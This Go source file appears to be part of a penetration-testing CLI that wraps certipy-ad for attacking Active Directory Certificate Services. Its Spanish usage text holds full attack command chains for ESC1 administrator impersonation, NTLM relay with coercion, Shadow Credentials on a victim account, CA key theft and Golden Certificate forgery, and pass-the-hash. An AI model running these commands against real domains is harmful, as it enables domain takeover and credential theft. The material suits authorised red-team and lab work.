package client

import (
	"fmt"
	"strings"
)

var certipySubcmds = []string{
	"find", "req", "auth", "ca", "shadow", "relay", "forge", "template", "account", "cert", "parse",
}

const certipyUsage = `uso: certipy <subcomando> [opciones]

  Enumera y abusa de Active Directory Certificate Services (ADCS).
  La herramienta es certipy-ad v5; se instala con: pip3 install certipy-ad

  Nota de autenticación:
    -u user@domain    (formato certipy: usuario@dominio)
    -p password
    -H :NThash        (pass-the-hash; se convierte a -hashes :NT)
    -k                (Kerberos, usa KRB5CCNAME)
    -dc-ip <ip>       (recomendado siempre)

subcomandos:
  find       Enumerar ADCS: CAs, plantillas, vulnerabilidades (ESC1-ESC16)
  req        Solicitar un certificado desde una plantilla
  auth       Autenticarse con un certificado PFX → TGT + hash NT
  ca         Gestionar la CA (plantillas, peticiones, backup)
  shadow     Shadow Credentials: añadir/eliminar msDS-KeyCredentialLink
  relay      Relay NTLM a ADCS HTTP (ESC8) o RPC (ESC11)
  forge      Forjar certificados con la CA key o auto-firmados
  template   Modificar plantillas de certificado directamente
  account    Crear/modificar cuentas de usuario y máquina
  cert       Gestionar archivos PFX/PEM/DER

ejemplos — flujo ESC1 (SAN arbitrario):
  # 1. Enumerar plantillas vulnerables
  certipy find 10.2.20.100 -u mssql_svc@cs.org -p shelby -dc-ip 10.2.20.100 -vulnerable -stdout

  # 2. Solicitar cert con UPN del administrador
  certipy req 10.2.20.100 -u mssql_svc@cs.org -p shelby -dc-ip 10.2.20.100 \
    -ca cs-WIN2022-SRV-X64-CA -template VulnTemplate -upn administrator@cs.org

  # 3. Autenticarse con el certificado → TGT + hash NT
  certipy auth -pfx administrator.pfx -dc-ip 10.2.20.100

ejemplos — flujo ESC8 (relay HTTP):
  # Interceptar autenticaciones NTLM de la CA y solicitar cert
  certipy relay 10.2.20.100 -target http://10.2.20.100

ejemplos — Shadow Credentials (PKINIT abuse):
  # Añadir Key Credential Link a la víctima y obtener cert automáticamente
  certipy shadow 10.2.20.100 -u Administrator@cs.org -p 'P@ss1!' -account victim -dc-ip 10.2.20.100 auto

ejemplos — Golden Certificate (CA key comprometida):
  # Backup de la CA (necesita Manage CA)
  certipy ca 10.2.20.100 -u Administrator@cs.org -p 'P@ss1!' -ca cs-WIN2022-SRV-X64-CA -backup
  # Forjar cert para cualquier usuario
  certipy forge -ca-pfx cs-WIN2022-SRV-X64-CA.pfx -upn administrator@cs.org

  Para ayuda detallada de un subcomando: certipy <sub> -h`

// buildCertipyAuth translates our flag convention to certipy's format.
// certipy uses -u user@domain, -p pass, -hashes :NT (not -H).
func buildCertipyAuth(flags map[string]string) []string {
	var a []string
	if u := flags["u"]; u != "" {
		a = append(a, "-u", u)
	}
	if p := flags["p"]; p != "" {
		a = append(a, "-p", p)
	}
	if h := flags["H"]; h != "" {
		if !strings.Contains(h, ":") {
			h = ":" + h
		}
		a = append(a, "-hashes", h)
	}
	if flags["k"] != "" {
		a = append(a, "-k", "-no-pass")
	}
	return a
}

func (cl *CLI) cmdCertipy(args []string) {
	tool := cl.mustTool("certipy-ad", "certipy")
	if tool == "" {
		fmt.Println("[!] instala con: pip3 install certipy-ad")
		return
	}

	if len(args) == 0 {
		fmt.Println(certipyUsage)
		return
	}

	sub := args[0]
	rest := args[1:]

	// Handle -h before dispatching so we get certipy's own help
	for _, a := range rest {
		if a == "-h" || a == "--help" {
			cl.runTool(append([]string{tool, sub}, rest...))
			return
		}
	}

	switch sub {
	case "find":
		cl.certipyFind(tool, rest)
	case "req":
		cl.certipyReq(tool, rest)
	case "auth":
		cl.certipyAuth(tool, rest)
	case "ca":
		cl.certipyCa(tool, rest)
	case "shadow":
		cl.certipyShadow(tool, rest)
	case "relay":
		cl.certipyRelay(tool, rest)
	case "forge":
		cl.certipyForge(tool, rest)
	case "template", "account", "cert", "parse":
		// passthrough sin transformación
		cl.runTool(append([]string{tool, sub}, rest...))
	default:
		fmt.Printf("[!] subcomando desconocido: %s\n\n", sub)
		fmt.Println(certipyUsage)
	}
}

// ── find ──────────────────────────────────────────────────────────────────

const certipyFindUsage = `uso: certipy find <dc-ip> -u user@domain [-p pass] [-H hash] [-k]
                         [-vulnerable] [-enabled] [-stdout] [-dc-only]

  Enumera CAs, plantillas y misconfigurations (ESC1–ESC16).
  -vulnerable   mostrar solo plantillas vulnerables
  -enabled      mostrar solo plantillas habilitadas
  -stdout       imprimir resultado en pantalla (además de guardar fichero)
  -dc-only      solo consultar el DC (sin comprobar Web Enrollment)

ejemplos:
  certipy find 10.2.20.100 -u mssql_svc@cs.org -p shelby -dc-ip 10.2.20.100 -vulnerable -stdout
  certipy find 10.2.20.100 -u mssql_svc@cs.org -H :8846f7eaee8fb117ad06bdd830b7586c -vulnerable -stdout`

func (cl *CLI) certipyFind(tool string, args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" {
		fmt.Println(certipyFindUsage)
		return
	}
	dcIP := pos[0]
	if flags["dc-ip"] != "" {
		dcIP = flags["dc-ip"]
	}
	a := []string{tool, "find", "-dc-ip", dcIP}
	a = append(a, buildCertipyAuth(flags)...)
	if flags["vulnerable"] != "" {
		a = append(a, "-vulnerable")
	}
	if flags["enabled"] != "" {
		a = append(a, "-enabled")
	}
	if flags["stdout"] != "" {
		a = append(a, "-stdout")
	} else {
		// Default: print to stdout for convenience
		a = append(a, "-stdout")
	}
	if flags["dc-only"] != "" {
		a = append(a, "-dc-only")
	}
	fmt.Printf("[*] certipy find → %s\n", dcIP)
	cl.runTool(a)
}

// ── req ───────────────────────────────────────────────────────────────────

const certipyReqUsage = `uso: certipy req <target> -u user@domain [-p pass] [-H hash] [-k]
                        -ca <CA-name> [-template <tmpl>] [-upn <upn>]
                        [-dns <dns>] [-sid <sid>] [-on-behalf-of domain\user]
                        [-pfx <agent.pfx>] [-dc-ip <ip>] [-out <file>]

  Solicita un certificado desde una plantilla de la CA.
  La CA puede obtenerse con: certipy find ... -vulnerable -stdout
  -upn      UPN a incluir en el SAN (ESC1, ESC2: suplantación de admin)
  -on-behalf-of  solicitud en nombre de otra cuenta (ESC3: enrollment agent)
  -pfx      certificado de enrollment agent para -on-behalf-of

ejemplos:
  # ESC1: plantilla permite SAN arbitrario
  certipy req 10.2.20.100 -u mssql_svc@cs.org -p shelby -dc-ip 10.2.20.100 \
    -ca cs-WIN2022-SRV-X64-CA -template VulnTemplate -upn administrator@cs.org

  # ESC3: enrollment agent → solicitar en nombre de administrador
  certipy req 10.2.20.100 -u agent@cs.org -p shelby -dc-ip 10.2.20.100 \
    -ca cs-WIN2022-SRV-X64-CA -template EnrollmentAgent -pfx agent.pfx \
    -on-behalf-of cs.org\Administrator`

func (cl *CLI) certipyReq(tool string, args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" || flags["ca"] == "" {
		fmt.Println(certipyReqUsage)
		return
	}
	target := pos[0]
	dcIP := flags["dc-ip"]
	if dcIP == "" {
		dcIP = target
	}
	a := []string{tool, "req", "-dc-ip", dcIP, "-target", target}
	a = append(a, buildCertipyAuth(flags)...)
	a = append(a, "-ca", flags["ca"])
	if t := flags["template"]; t != "" {
		a = append(a, "-template", t)
	}
	if v := flags["upn"]; v != "" {
		a = append(a, "-upn", v)
	}
	if v := flags["dns"]; v != "" {
		a = append(a, "-dns", v)
	}
	if v := flags["sid"]; v != "" {
		a = append(a, "-sid", v)
	}
	if v := flags["on-behalf-of"]; v != "" {
		a = append(a, "-on-behalf-of", v)
	}
	if v := flags["pfx"]; v != "" {
		a = append(a, "-pfx", v)
	}
	if v := flags["out"]; v != "" {
		a = append(a, "-out", v)
	}
	fmt.Printf("[*] certipy req → %s  ca=%s\n", target, flags["ca"])
	cl.runTool(a)
}

// ── auth ──────────────────────────────────────────────────────────────────

const certipyAuthUsage = `uso: certipy auth -pfx <archivo.pfx> [-dc-ip <ip>] [-ldap-shell]

  Autentica con un certificado PFX vía PKINIT.
  Obtiene: TGT (.ccache) + hash NT de la cuenta.
  -ldap-shell   abre shell LDAP (útil cuando PKINIT no está disponible)

  Después de ejecutar:
    export KRB5CCNAME=<usuario>.ccache

ejemplos:
  certipy auth -pfx administrator.pfx -dc-ip 10.2.20.100
  certipy auth -pfx administrator.pfx -dc-ip 10.2.20.100 -ldap-shell`

func (cl *CLI) certipyAuth(tool string, args []string) {
	_, flags := parseLocalFlags(args)
	if flags["pfx"] == "" {
		fmt.Println(certipyAuthUsage)
		return
	}
	a := []string{tool, "auth", "-pfx", flags["pfx"]}
	if v := flags["dc-ip"]; v != "" {
		a = append(a, "-dc-ip", v)
	}
	if flags["ldap-shell"] != "" {
		a = append(a, "-ldap-shell")
	}
	if v := flags["username"]; v != "" {
		a = append(a, "-username", v)
	}
	if v := flags["domain"]; v != "" {
		a = append(a, "-domain", v)
	}
	fmt.Printf("[*] certipy auth → %s\n", flags["pfx"])
	cl.runTool(a)
}

// ── ca ────────────────────────────────────────────────────────────────────

const certipyCaUsage = `uso: certipy ca <target> -u user@domain [-p pass] [-H hash]
                       -ca <CA-name> [acción] [-dc-ip <ip>]

  Gestiona la Certification Authority.

  acciones:
    -list-templates              listar plantillas habilitadas
    -enable-template <name>      habilitar plantilla
    -disable-template <name>     deshabilitar plantilla
    -issue-request <id>          aprobar petición pendiente
    -deny-request <id>           denegar petición
    -add-officer <user>          añadir Certificate Manager
    -backup                      hacer backup del cert+key de la CA

ejemplos:
  certipy ca 10.2.20.100 -u Administrator@cs.org -p 'P@ss1!' -ca cs-WIN2022-SRV-X64-CA -list-templates
  certipy ca 10.2.20.100 -u Administrator@cs.org -p 'P@ss1!' -ca cs-WIN2022-SRV-X64-CA -enable-template SubCA
  certipy ca 10.2.20.100 -u Administrator@cs.org -p 'P@ss1!' -ca cs-WIN2022-SRV-X64-CA -backup`

func (cl *CLI) certipyCa(tool string, args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 || flags["u"] == "" || flags["ca"] == "" {
		fmt.Println(certipyCaUsage)
		return
	}
	target := pos[0]
	dcIP := flags["dc-ip"]
	if dcIP == "" {
		dcIP = target
	}
	a := []string{tool, "ca", "-dc-ip", dcIP, "-target", target}
	a = append(a, buildCertipyAuth(flags)...)
	a = append(a, "-ca", flags["ca"])
	// Pass remaining action flags through
	for _, f := range []string{
		"list-templates", "enable-template", "disable-template",
		"issue-request", "deny-request", "add-officer", "remove-officer",
		"add-manager", "remove-manager", "backup",
	} {
		if v := flags[f]; v != "" {
			if v == "true" {
				a = append(a, "-"+f)
			} else {
				a = append(a, "-"+f, v)
			}
		}
	}
	cl.runTool(a)
}

// ── shadow ────────────────────────────────────────────────────────────────

const certipyShadowUsage = `uso: certipy shadow <target> -u user@domain [-p pass] [-H hash]
                           [-account <victim>] [-dc-ip <ip>]
                           <action: list|add|remove|clear|info|auto>

  Manipula Key Credential Links (msDS-KeyCredentialLink) en AD.
  'auto' añade el atributo, obtiene el cert y lo elimina en un solo paso.

  Requisito: el atacante debe tener permisos de escritura sobre el objeto víctima.

ejemplos:
  # Auto-exploit: obtener cert de victim y limpiar la huella
  certipy shadow 10.2.20.100 -u mssql_svc@cs.org -p shelby -account victim -dc-ip 10.2.20.100 auto

  # Ver Key Credentials actuales de la víctima
  certipy shadow 10.2.20.100 -u mssql_svc@cs.org -p shelby -account victim -dc-ip 10.2.20.100 list

  # Luego autenticar con el certificado obtenido
  certipy auth -pfx victim.pfx -dc-ip 10.2.20.100`

func (cl *CLI) certipyShadow(tool string, args []string) {
	pos, flags := parseLocalFlags(args)
	// pos[0] = target, last pos = action
	if len(pos) < 2 || flags["u"] == "" {
		fmt.Println(certipyShadowUsage)
		return
	}
	target := pos[0]
	action := pos[len(pos)-1]
	dcIP := flags["dc-ip"]
	if dcIP == "" {
		dcIP = target
	}
	a := []string{tool, "shadow", "-dc-ip", dcIP, "-target", target}
	a = append(a, buildCertipyAuth(flags)...)
	if v := flags["account"]; v != "" {
		a = append(a, "-account", v)
	}
	if v := flags["device-id"]; v != "" {
		a = append(a, "-device-id", v)
	}
	if v := flags["out"]; v != "" {
		a = append(a, "-out", v)
	}
	a = append(a, action)
	fmt.Printf("[*] certipy shadow %s → %s\n", action, target)
	cl.runTool(a)
}

// ── relay ─────────────────────────────────────────────────────────────────

const certipyRelayUsage = `uso: certipy relay -target <protocol://ca-host> [-ca <CA-name>]
                          [-template <tmpl>] [-upn <upn>] [-forever]

  Relay NTLM a ADCS para obtener certificados de las cuentas retransmitidas.
  -target   URL de la CA: http://<ca> (ESC8) o rpc://<ca> (ESC11)
  -ca       nombre de la CA (requerido para ESC11/RPC)
  -upn      UPN a incluir en el SAN
  -forever  seguir esperando conexiones (no salir tras el primero)

  Flujo ESC8 (HTTP Web Enrollment):
    1. Iniciar: certipy relay -target http://10.2.20.100
    2. En otra terminal: responder -I eth0 -A   (modo análisis, sin SMB/HTTP)
       o provocar autenticación: coerce/PetitPotam/PrinterBug → ca-host

  Flujo ESC11 (RPC relay, sin Web Enrollment):
    certipy relay -target rpc://10.2.20.100 -ca cs-WIN2022-SRV-X64-CA -template DomainController

ejemplos:
  certipy relay -target http://10.2.20.100
  certipy relay -target http://10.2.20.100 -template DomainController -forever
  certipy relay -target rpc://10.2.20.100 -ca cs-WIN2022-SRV-X64-CA`

func (cl *CLI) certipyRelay(tool string, args []string) {
	_, flags := parseLocalFlags(args)
	if flags["target"] == "" {
		fmt.Println(certipyRelayUsage)
		return
	}
	a := []string{tool, "relay", "-target", flags["target"]}
	if v := flags["ca"]; v != "" {
		a = append(a, "-ca", v)
	}
	if v := flags["template"]; v != "" {
		a = append(a, "-template", v)
	}
	if v := flags["upn"]; v != "" {
		a = append(a, "-upn", v)
	}
	if v := flags["dns"]; v != "" {
		a = append(a, "-dns", v)
	}
	if v := flags["interface"]; v != "" {
		a = append(a, "-interface", v)
	}
	if v := flags["port"]; v != "" {
		a = append(a, "-port", v)
	}
	if flags["forever"] != "" {
		a = append(a, "-forever")
	}
	fmt.Printf("[*] certipy relay → %s\n", flags["target"])
	cl.runTool(a)
}

// ── forge ─────────────────────────────────────────────────────────────────

const certipyForgeUsage = `uso: certipy forge -ca-pfx <ca.pfx> -upn <upn@domain> [-validity <days>] [-out <file>]
     certipy forge -upn <upn@domain>   (auto-firmado, sin CA real)

  Forja un certificado válido con la key de la CA comprometida.
  Útil cuando se ha hecho backup de la CA (Golden Certificate).
  Sin -ca-pfx genera un certificado auto-firmado (validez limitada).

ejemplos:
  # Golden Cert con CA comprometida
  certipy forge -ca-pfx cs-WIN2022-SRV-X64-CA.pfx -upn administrator@cs.org

  # Auto-firmado (sin CA real)
  certipy forge -upn administrator@cs.org

  # Autenticar con el certificado forjado
  certipy auth -pfx administrator_forged.pfx -dc-ip 10.2.20.100`

func (cl *CLI) certipyForge(tool string, args []string) {
	_, flags := parseLocalFlags(args)
	if flags["upn"] == "" && flags["dns"] == "" {
		fmt.Println(certipyForgeUsage)
		return
	}
	a := []string{tool, "forge"}
	if v := flags["ca-pfx"]; v != "" {
		a = append(a, "-ca-pfx", v)
	}
	if v := flags["ca-password"]; v != "" {
		a = append(a, "-ca-password", v)
	}
	if v := flags["upn"]; v != "" {
		a = append(a, "-upn", v)
	}
	if v := flags["dns"]; v != "" {
		a = append(a, "-dns", v)
	}
	if v := flags["sid"]; v != "" {
		a = append(a, "-sid", v)
	}
	if v := flags["subject"]; v != "" {
		a = append(a, "-subject", v)
	}
	if v := flags["validity"]; v != "" {
		a = append(a, "-validity-period", v)
	}
	if v := flags["out"]; v != "" {
		a = append(a, "-out", v)
	}
	cl.runTool(a)
}
